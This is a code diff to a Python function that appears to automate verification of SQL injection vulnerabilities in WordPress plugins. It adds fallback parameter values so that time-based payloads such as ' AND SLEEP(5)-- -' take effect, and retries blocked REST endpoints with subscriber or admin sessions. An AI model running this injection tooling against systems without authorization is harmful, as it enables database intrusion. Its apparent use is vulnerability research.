@@ -4600,6 +4600,22 @@ def verify_wordpress_sqli(
                 step(f"email restaurado en orig_value/endpoint: '{orig_value}' "
                      f"(LLM mangleaba @ → _ aunque sqli_param='{sqli_param}')")
 
+        # Si orig_value queda vacio o solo espacios despues de stripping, usar fallbacks
+        # semanticos segun el nombre del parametro para que los payloads tengan valor base valido.
+        # Sin esto, " AND SLEEP(5)-- -" nunca evalúa la condicion SQL porque no hay valor precedente.
+        if not orig_value or not orig_value.strip():
+            _param_lower = sqli_param.lower()
+            if any(k in _param_lower for k in ("id", "post", "page", "num", "count", "order", "sort")):
+                orig_value = "1"
+            elif any(k in _param_lower for k in ("email", "mail", "user", "login", "name")):
+                orig_value = "test@example.com"
+            elif any(k in _param_lower for k in ("slug", "key", "token", "code", "search", "query", "q")):
+                orig_value = "test"
+            else:
+                orig_value = "1"
+            step(f"orig_value vacio — usando fallback '{orig_value}' para parametro '{sqli_param}' "
+                 f"(sin valor base, los payloads SLEEP/AND no evaluan la condicion SQL)")
+
         # algunos plugins (ver _SQLI_CUSTOM_SORT_GATE) gatean el sumidero real detras de una
         # comparacion EXACTA contra un valor guardado en META de un post real -- sin esto, se
         # puede probar el payload correcto contra el parametro correcto y nunca confirmarse,
@@ -4952,6 +4968,44 @@ def verify_wordpress_sqli(
                     res.evidence["sqli_sesion_admin"] = True
             except Exception:
                 pass
+        # REST endpoints (/wp-json/) que responden 401/403 con sesion anonima:
+        # intentar con sesion de subscriber antes de continuar con payloads.
+        # Muchos CVEs autenticados requieren cualquier rol (subscriber) para acceder
+        # al REST endpoint -- el engine estaba descartandolos por 401 sin reintentar.
+        _is_rest_ep = "/wp-json/" in endpoint
+        _needs_rest_auth_retry = (
+            _is_rest_ep and _wp_access_denied and
+            not _needs_admin_retry and
+            boot.sub_sess is not None
+        )
+        if _needs_rest_auth_retry:
+            step(f"REST endpoint retornó {base_resp.status_code} anonimamente -- "
+                 f"reintentando con sesión de subscriber (autenticado)...")
+            _attack_sess_rest_saved = _attack_sess
+            _attack_sess = boot.sub_sess
+            try:
+                base_resp = send(orig_value)
+                base_len = len(base_resp.text or "")
+                _ctrl_body_raw = (base_resp.text or "").strip()
+                if base_resp.status_code in (401, 403):
+                    step(f"[WARN] REST endpoint sigue retornando {base_resp.status_code} "
+                         f"con subscriber -- probando con admin...")
+                    _attack_sess = boot.admin_sess
+                    base_resp = send(orig_value)
+                    base_len = len(base_resp.text or "")
+                    _ctrl_body_raw = (base_resp.text or "").strip()
+                    if base_resp.status_code in (401, 403):
+                        step("[WARN] REST endpoint sigue inaccesible con admin -- "
+                             "posible endpoint bloqueado o requiere nonce específico")
+                        _attack_sess = _attack_sess_rest_saved
+                    else:
+                        step(f"admin session funciona para REST endpoint: {base_len} bytes")
+                        res.evidence["sqli_sesion_admin"] = True
+                else:
+                    step(f"subscriber session funciona para REST endpoint: {base_len} bytes")
+                    res.evidence["sqli_sesion_subscriber"] = True
+            except Exception:
+                _attack_sess = _attack_sess_rest_saved
         # Si la respuesta de control es vacia o muy pequeña (<= 10 bytes, tipicamente '[]', 'null',
         # '{}', '0', ''), el endpoint probablemente necesita datos en la DB para producir diferencial.
         # Intentar sembrar filas minimas en las tablas personalizadas del plugin, luego reintentar
